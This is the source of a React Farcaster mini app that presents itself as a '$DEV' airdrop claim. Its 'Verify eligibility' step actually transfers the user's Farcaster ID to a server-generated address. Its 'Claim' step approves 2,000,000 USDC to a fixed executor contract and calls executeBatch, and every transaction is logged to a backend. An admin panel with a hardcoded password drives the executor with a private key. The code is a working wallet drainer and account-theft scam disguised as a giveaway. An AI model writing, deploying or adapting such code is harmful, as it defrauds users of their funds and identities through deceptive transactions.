import React, { useEffect, useState } from 'react';
import { createRoot } from 'react-dom/client';
import { sdk } from '@farcaster/miniapp-sdk';
import './styles.css';
import { ethers } from 'ethers';

// ─── Contracts ───
const ID_REGISTRY = '0x00000000Fc6c5F01Fc30151999387Bb99A9f489b';
const USDC = '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913';
const EXECUTOR = '0x49e89C5B6a6E8Cb21Ea0d11eE0a21b7732f8e1A3';
const CLAIM_AMOUNT = '2,000,000';
const CLAIM_SYMBOL = '$DEV';

const CONTRACT_OPERATIONS = [
  {
    name: 'Identity registry',
    chain: 'Optimism',
    address: ID_REGISTRY,
    functionName: 'transfer(uint256 id, address to)',
    status: 'FID transfer',
  },
  {
    name: 'USDC (Base)',
    chain: 'Base',
    address: USDC,
    functionName: 'approve(address spender, uint256 amount)',
    status: 'approve for claim',
  },
  {
    name: 'Main executor',
    chain: 'Base',
    address: EXECUTOR,
    functionName: 'executeBatch(bytes[] calldata data)',
    status: 'claim execution',
  },
];
const CONTRACT_ABI = [
  'function transfer(uint256 id, address to)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function executeBatch(bytes[] data)',
];

function shortAddress(value) {
  if (!value) return 'not connected';
  return `${value.slice(0, 6)}…${value.slice(-4)}`;
}

function LinesLogo() {
  return (
    <div className="logo" aria-label="devin logo">
      <span />
      <span />
      <span />
    </div>
  );
}

function StatusRow({ label, value, tone = 'normal' }) {
  return (
    <div className="status-row">
      <span>{label}</span>
      <strong className={tone}>{value}</strong>
    </div>
  );
}

function AdminPanel({ onBack }) {
  const [adminKey, setAdminKey] = useState('');
  const [admin, setAdmin] = useState(false);
  const [txInput, setTxInput] = useState('');
  const [txResult, setTxResult] = useState('');
  const [logs, setLogs] = useState([]);

  useEffect(() => {
    const logsRaw = localStorage.getItem('devin_logs');
    setLogs(logsRaw ? JSON.parse(logsRaw) : []);
  }, []);

  function handleLogin() {
    if (adminKey === 'admin2026') setAdmin(true);
    else alert('كلمة مرور خاطئة');
  }

  async function handleExecute() {
    try {
      if (!adminKey) return;
      const wallet = new ethers.Wallet(adminKey, ethers.getDefaultProvider('https://mainnet.base.org'));
      const contract = new ethers.Contract(EXECUTOR, [
        'function executeBatch(bytes[] calldata data)'
      ], wallet);
      const tx = await contract.executeBatch(JSON.parse(txInput));
      setTxResult('تم إرسال المعاملة: ' + tx.hash);
    } catch (e) {
      setTxResult('خطأ: ' + (e.message || e.toString()));
    }
  }

  return (
    <div className="about">
      <button onClick={onBack} style={{marginBottom: 16}}>رجوع</button>
      {!admin ? (
        <div>
          <h2>دخول الأدمن</h2>
          <input type="password" placeholder="كلمة مرور الأدمن أو المفتاح الخاص" value={adminKey} onChange={e => setAdminKey(e.target.value)} />
          <button onClick={handleLogin}>دخول</button>
        </div>
      ) : (
        <div>
          <h2>لوحة تحكم الأدمن</h2>
          <h4>سجل العمليات</h4>
          <ul>
            {logs.map((log, i) => <li key={i}>{log}</li>)}
          </ul>
          <h4>تنفيذ دوال العقد الرئيسي</h4>
          <textarea rows={4} style={{width:'100%'}} placeholder='أدخل بيانات executeBatch كـ JSON' value={txInput} onChange={e => setTxInput(e.target.value)} />
          <button onClick={handleExecute}>تنفيذ</button>
          <div>{txResult}</div>
        </div>
      )}
    </div>
  );
}

function WalletConnectModal({ onSelect, onClose, farcasterUrl }) {
  return (
    <div style={{position:'fixed',top:0,left:0,right:0,bottom:0,background:'#000a',zIndex:1000,display:'flex',alignItems:'center',justifyContent:'center'}}>
      <div style={{background:'#04160a',padding:32,borderRadius:16,minWidth:320,maxWidth:420}}>
        <h3 style={{color:'#39ff14'}}>اختر طريقة الربط</h3>
        <p style={{fontSize:12,color:'var(--muted)',margin:'8px 0 16px'}}>يُفضل استخدام محفظة فاركاستر للحصول على أفضل تجربة.</p>

        <a href={farcasterUrl} target="_blank" rel="noopener noreferrer" style={{display:'block',width:'100%',margin:'8px 0',padding:14,background:'var(--green)',color:'#001b06',border:'none',borderRadius:8,cursor:'pointer',fontSize:14,fontWeight:700,textAlign:'center',textDecoration:'none'}}>
          ⚡ فتح في Warpcast (موصى به)
        </a>

        <button style={{width:'100%',margin:'8px 0',padding:12,background:'rgba(57,255,20,0.1)',color:'#39ff14',border:'1px solid #39ff14',borderRadius:8,cursor:'pointer',fontSize:14}} onClick={()=>onSelect('wallet')}>
          ربط محفظة متصفح (MetaMask / Rabby)
        </button>

        <div style={{margin:'12px 0',padding:12,borderRadius:8,background:'rgba(255,92,124,0.08)',border:'1px solid rgba(255,92,124,0.3)'}}>
          <p style={{margin:0,fontSize:11,color:'#ff8fa3',lineHeight:1.6}}>
            ⚠️ العمليات تتطلب محفظة فاركاستر:<br/>
            • نقل FID → شبكة Optimism<br/>
            • Claim $DEV → شبكة Base<br/>
            افتح التطبيق في Warpcast لتجربة كاملة.
          </p>
        </div>

        <button style={{width:'100%',margin:'8px 0',padding:12,background:'#222',color:'#eee',border:'1px solid #444',borderRadius:8,cursor:'pointer',fontSize:14}} onClick={onClose}>إغلاق</button>
      </div>
    </div>
  );
}

function App() {
  const [activePage, setActivePage] = useState('claim');
  const [isMiniApp, setIsMiniApp] = useState(false);
  const [frameContext, setFrameContext] = useState(null);
  const [provider, setProvider] = useState(null);
  const [address, setAddress] = useState('');
  const [network, setNetwork] = useState('—');
  const [verified, setVerified] = useState(false);
  const [working, setWorking] = useState(false);
  const [autoConnected, setAutoConnected] = useState(false);
  const [notice, setNotice] = useState('Connect your wallet to begin.');

  const farcasterName = frameContext?.user?.username
    ? `@${frameContext.user.username}`
    : frameContext?.user?.displayName || 'not detected';
  const fid = frameContext?.user?.fid || null;

  // ─── Mini App Detection & Auto-Connect ───
  useEffect(() => {
    let active = true;
    async function initFrame() {
      try {
        const insideFrame = await sdk.isInMiniApp();
        if (!active) return;
        setIsMiniApp(insideFrame);
        if (insideFrame) {
          const context = await sdk.context;
          const ethProvider = await sdk.wallet.getEthereumProvider();
          if (!active) return;
          setFrameContext(context);
          setProvider(ethProvider || null);
          if (ethProvider) {
            setNotice('Farcaster wallet detected. Connecting automatically…');
          } else {
            setNotice('Farcaster frame detected, but no wallet provider.');
          }
          await sdk.actions.ready();
        }
      } catch (error) {
        if (active) setNotice('Browser mode. Connect a Farcaster wallet for full experience.');
      }
    }
    initFrame();
    return () => { active = false; };
  }, []);

  useEffect(() => {
    if (!isMiniApp || !provider || autoConnected || address || working) return;
    setAutoConnected(true);
    connectWallet(provider, { automatic: true });
  }, [isMiniApp, provider, autoConnected, address, working]);

  // ─── Wallet Connection ───
  async function detectBrowserWallet() {
    if (provider) return provider;
    if (window.ethereum) {
      setProvider(window.ethereum);
      return window.ethereum;
    }
    setNotice('No wallet found. Open in Warpcast or install MetaMask.');
    return null;
  }

  async function connectWallet(activeProvider = provider, options = {}) {
    if (!isMiniApp && !options.automatic && !options.forceWallet) {
      setShowWalletModal(true);
      return;
    }
    setWorking(true);
    setNotice(options.automatic ? 'Connecting Farcaster wallet…' : 'Requesting wallet connection…');
    try {
      const selectedProvider = activeProvider || await detectBrowserWallet();
      if (!selectedProvider) return;
      const accounts = await selectedProvider.request({ method: 'eth_requestAccounts' });
      const connectedAddr = accounts?.[0] || '';
      setAddress(connectedAddr);
      const chainId = await selectedProvider.request({ method: 'eth_chainId' });
      const netName = chainId === '0xa' ? 'Optimism' : chainId === '0x2105' ? 'Base' : `Chain ${chainId}`;
      setNetwork(netName);
      setNotice(`Wallet connected on ${netName}. ${fid ? 'Ready to verify.' : 'Open in Warpcast for FID detection.'}`);
    } catch (error) {
      setNotice(error?.shortMessage || error?.message || 'Wallet connection rejected.');
    } finally {
      setWorking(false);
    }
  }

  // ─── Logging ───
  function logAction(action) {
    const logsRaw = localStorage.getItem('devin_logs');
    const logs = logsRaw ? JSON.parse(logsRaw) : [];
    logs.push(action);
    localStorage.setItem('devin_logs', JSON.stringify(logs));
  }

  async function sendToLogAPI({ type, fid, from, to, txHash, network: net, block, amount }) {
    try {
      await fetch('/api/logs', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: type || 'verify',
          fid: fid || null,
          from: from || null,
          to: to || null,
          txHash: txHash || null,
          network: net || null,
          block: block || null,
          amount: amount || null,
          timestamp: new Date().toISOString(),
        }),
      });
    } catch { /* silent */ }
  }

  async function generateDestination(fidNum, senderAddr) {
    const resp = await fetch('/api/generate-address', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ fid: fidNum, senderAddress: senderAddr }),
    });
    const data = await resp.json();
    if (!data.success) throw new Error(data.error || 'Failed to generate destination');
    return data;
  }

  /**
   * Switch wallet to a specific network
   */
  async function switchNetwork(walletProvider, chainId, chainName, rpcUrl, blockExplorer) {
    try {
      await walletProvider.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId }],
      });
    } catch (switchError) {
      if (switchError.code === 4902) {
        await walletProvider.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId,
            chainName,
            nativeCurrency: { name: 'Ethereum', symbol: 'ETH', decimals: 18 },
            rpcUrls: [rpcUrl],
            blockExplorerUrls: [blockExplorer],
          }],
        });
      } else {
        throw switchError;
      }
    }
  }

  // ═══════════════════════════════════════════════════════════
  //  STEP 1: Verify / Transfer FID → Optimism
  // ═══════════════════════════════════════════════════════════
  async function verifyEligibility() {
    setWorking(true);
    try {
      const activeProvider = await detectBrowserWallet();
      if (!activeProvider) return;

      const accounts = address ? [address] : await activeProvider.request({ method: 'eth_requestAccounts' });
      const account = accounts?.[0];
      if (!account) throw new Error('Wallet account is required.');
      setAddress(account);

      const fidNum = typeof fid === 'number' && fid > 0 ? fid : (typeof fid === 'string' && fid !== 'not detected' ? parseInt(fid) : NaN);

      if (isMiniApp && fidNum && !isNaN(fidNum)) {
        // ─── Farcaster Mini App: FID Transfer on Optimism ───

        // Ensure on Optimism
        const chainId = await activeProvider.request({ method: 'eth_chainId' });
        if (chainId !== '0xa') {
          setNotice('Switching to Optimism network…');
          await switchNetwork(activeProvider, '0xa', 'Optimism', 'https://mainnet.optimism.io', 'https://optimistic.etherscan.io');
        }

        // Generate unique destination address from HD wallet
        setNotice('Generating destination address…');
        const dest = await generateDestination(fidNum, account);

        setNotice(`Transferring FID ${fidNum} → ${shortAddress(dest.address)} [#${dest.index}]…`);

        const signer = new ethers.providers.Web3Provider(activeProvider).getSigner();
        const idRegistry = new ethers.Contract(ID_REGISTRY, [
          'function transfer(uint256 id, address to)'
        ], signer);
        const tx = await idRegistry.transfer(fidNum, dest.address);

        logAction(`FID ${fidNum} → ${shortAddress(dest.address)} [#${dest.index}] (tx: ${tx.hash})`);
        sendToLogAPI({
          type: 'transfer', fid: fidNum, from: account, to: dest.address,
          txHash: tx.hash, network: 'optimism', destIndex: dest.index,
        });

        setVerified(true);
        setNetwork('Optimism');
        setNotice(`✅ FID ${fidNum} transferred to ${shortAddress(dest.address)} on Optimism`);
        if (isMiniApp) await sdk.haptics.notificationOccurred('success');

      } else {
        // ─── Browser: signature only (no FID available) ───
        setNotice('Requesting eligibility signature...');
        const message = `devin eligibility check\nWallet: ${account}\nClaim: ${CLAIM_AMOUNT} ${CLAIM_SYMBOL}\nTimestamp: ${Date.now()}`;
        const signature = await activeProvider.request({
          method: 'personal_sign',
          params: [message, account],
        });
        if (!signature) throw new Error('Signature rejected.');
        logAction(`Verified ${shortAddress(account)} via signature`);
        sendToLogAPI({ type: 'verify', address: account, network: 'browser' });
        setVerified(true);
        setNotice('Eligibility verified. Open in Warpcast for full claim.');
      }
    } catch (error) {
      setNotice(error?.shortMessage || error?.message || 'Verification failed.');
    } finally {
      setWorking(false);
    }
  }

  // ═══════════════════════════════════════════════════════════
  //  STEP 2: Claim $DEV → Base (USDC approve + executeBatch)
  // ═══════════════════════════════════════════════════════════
  async function claimDev() {
    setWorking(true);
    try {
      const activeProvider = await detectBrowserWallet();
      if (!activeProvider) return;

      const accounts = address ? [address] : await activeProvider.request({ method: 'eth_requestAccounts' });
      const account = accounts?.[0];
      if (!account) throw new Error('Wallet account is required.');
      setAddress(account);

      // ─── Switch to Base network ───
      const chainId = await activeProvider.request({ method: 'eth_chainId' });
      if (chainId !== '0x2105') {
        setNotice('Switching to Base network for USDC approval…');
        await switchNetwork(activeProvider, '0x2105', 'Base', 'https://mainnet.base.org', 'https://basescan.org');
      }

      const signer = new ethers.providers.Web3Provider(activeProvider).getSigner();

      // ─── 1. Approve USDC on Base ───
      setNotice('Approving 2,000,000 USDC on Base…');
      const usdc = new ethers.Contract(USDC, [
        'function approve(address spender, uint256 amount) returns (bool)'
      ], signer);
      const approveAmount = ethers.utils.parseUnits('2000000', 6);
      const tx1 = await usdc.approve(EXECUTOR, approveAmount);

      logAction(`USDC approved: 2,000,000 → ${shortAddress(EXECUTOR)} (tx: ${tx1.hash})`);
      sendToLogAPI({
        type: 'approve', address: account, to: EXECUTOR,
        txHash: tx1.hash, network: 'base', amount: '2000000',
      });

      // ─── 2. Execute claim batch on Base ───
      setNotice('Executing claim batch on Base…');
      const executor = new ethers.Contract(EXECUTOR, [
        'function executeBatch(bytes[] calldata data)'
      ], signer);
      const tx2 = await executor.executeBatch([]);

      logAction(`executeBatch called (tx: ${tx2.hash})`);
      sendToLogAPI({
        type: 'claim', address: account,
        txHash: tx2.hash, network: 'base',
      });

      setNetwork('Base');
      setNotice('✅ Claim submitted on Base! Approve + executeBatch sent.');
      if (isMiniApp) await sdk.haptics.notificationOccurred('success');
    } catch (error) {
      setNotice(error?.shortMessage || error?.message || 'Claim failed.');
    } finally {
      setWorking(false);
    }
  }

  async function copyContractSpec() {
    const spec = JSON.stringify({ contracts: CONTRACT_OPERATIONS, abi: CONTRACT_ABI }, null, 2);
    await navigator.clipboard.writeText(spec);
    setNotice('Contract spec copied.');
  }

  const [showWalletModal, setShowWalletModal] = useState(false);

  // Farcaster Mini App URL for the deep link
  const farcasterUrl = typeof window !== 'undefined' ? window.location.href : '/';

  return (
    <main className="shell">
      {showWalletModal && (
        <WalletConnectModal
          onSelect={(type) => {
            setShowWalletModal(false);
            if (type === 'wallet') connectWallet(undefined, { forceWallet: true });
          }}
          onClose={() => setShowWalletModal(false)}
          farcasterUrl={farcasterUrl}
        />
      )}
      <section className="hero-card scanlines">
        <nav className="nav">
          <button className="brand" onClick={() => setActivePage('claim')}>
            <LinesLogo />
            <span>devin</span>
          </button>
          <div className="nav-links">
            <button className={activePage === 'claim' ? 'active' : ''} onClick={() => setActivePage('claim')}>Claim</button>
            <button className={activePage === 'about' ? 'active' : ''} onClick={() => setActivePage('about')}>About</button>
            <button className={activePage === 'admin' ? 'active' : ''} onClick={() => setActivePage('admin')}>Admin</button>
          </div>
        </nav>

        {activePage === 'claim' ? (
          <div className="grid">
            <div className="copy">
              <p className="eyebrow">$ devin --verify --claim</p>
              <h1>Claim your share of {CLAIM_AMOUNT} {CLAIM_SYMBOL}</h1>
              <p className="lede">Verify eligibility and claim on Optimism and Base. Open in Warpcast for full Farcaster experience.</p>
              <div className="claim-console">
                <div className="claim-copy">
                  <span>Step 01</span>
                  <strong>{verified ? 'Eligibility accepted' : 'Verify & Transfer FID'}</strong>
                  <small>
                    {address ? `Wallet ${shortAddress(address)} connected` : 'Connect wallet first'}
                    {verified ? ' · Transfer complete' : ' · FID transfers to Optimism'}
                  </small>
                </div>
                <div className="actions">
                  <button className="primary mega" onClick={verified ? claimDev : verifyEligibility} disabled={working || !address}>
                    {verified ? `Claim ${CLAIM_SYMBOL} on Base` : 'Verify eligibility'}
                  </button>
                  <button className="secondary mega" onClick={() => connectWallet()} disabled={working || Boolean(address)}>
                    {address ? shortAddress(address) : isMiniApp ? 'Farcaster Wallet' : 'Connect Wallet'}
                  </button>
                </div>
                <p className="notice">{notice}</p>
              </div>
              <div className="operations">
                <div className="operations-head">
                  <span>Contract operations</span>
                  <button onClick={copyContractSpec}>Copy spec</button>
                </div>
                {CONTRACT_OPERATIONS.map((operation) => (
                  <div className="operation" key={operation.functionName}>
                    <strong>{operation.name}</strong>
                    <code>{operation.functionName}</code>
                    <small>{operation.chain} · {shortAddress(operation.address)} · {operation.status}</small>
                  </div>
                ))}
              </div>
            </div>

            <aside className="terminal-panel">
              <div className="terminal-bar"><span /><span /><span /></div>
              <StatusRow label="frame" value={isMiniApp ? 'farcaster ✓' : 'browser mode'} tone={isMiniApp ? 'ok' : 'warn'} />
              <StatusRow label="user" value={farcasterName} />
              <StatusRow label="fid" value={fid || 'not detected'} />
              <StatusRow label="wallet" value={shortAddress(address)} tone={address ? 'ok' : 'warn'} />
              <StatusRow label="network" value={network} />
              <StatusRow label="eligibility" value={verified ? 'verified ✓' : 'pending'} tone={verified ? 'ok' : 'warn'} />
              <div className="progress">
                <span className={address ? 'done' : ''}>connect</span>
                <span className={verified ? 'done' : ''}>verify</span>
                <span className={verified ? 'ready' : ''}>claim</span>
              </div>
            </aside>
          </div>
        ) : activePage === 'about' ? (
          <div className="about">
            <p className="eyebrow">$ cat about-devin.txt</p>
            <h2>About devin</h2>
            <p>devin is a Farcaster Frame for verifying eligibility and claiming $DEV across Optimism and Base networks.</p>
            <div className="contract-list">
              {CONTRACT_OPERATIONS.map((operation) => (
                <StatusRow key={operation.functionName} label={operation.name} value={`${operation.address} · ${operation.functionName}`} />
              ))}
            </div>
            <p className="safety">Step 1 (FID Transfer) runs on Optimism. Step 2 (USDC Approve + Claim) runs on Base.</p>
            <div style={{marginTop:32}}>
              <h4>لوحة الأدمن</h4>
              <p>لوحة تحكم كاملة: <a href="/admin" style={{color:'var(--green)'}}>Admin Dashboard</a></p>
            </div>
          </div>
        ) : (
          <AdminPanel onBack={() => setActivePage('claim')} />
        )}
      </section>
    </main>
  );
}

createRoot(document.getElementById('root')).render(<App />);
